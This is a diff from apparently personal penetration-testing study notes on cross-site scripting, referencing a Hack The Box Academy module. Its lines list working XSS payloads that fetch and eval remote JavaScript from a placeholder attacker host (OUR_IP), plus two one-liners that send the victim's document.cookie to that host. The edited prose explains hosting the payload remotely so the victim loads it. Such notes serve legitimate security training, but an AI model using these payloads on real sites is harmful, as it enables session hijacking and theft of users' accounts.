@@ -59,10 +59,10 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
 <script>$.getScript("http://OUR_IP")</script>
 ```
-After finish identifying, we can use different payloads to have the victim sent its cookie to us, below is some of the payloads available, these payload can also be inputted into a script under our control, :
+After finish identifying, we can use different payloads to have the victim sent its cookie to us, below is some of the payloads available, these payload can also be inputted into a script under our control, then have the victim to load that respective script from our side so that we dont need to expose the payload directly:
 ```
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
-Again, refer to payload all the things to discover more payload
+Again, refer to payload all the things to discover more payload, also refer to https://academy.hackthebox.com/app/module/103/section/1008 for more detail
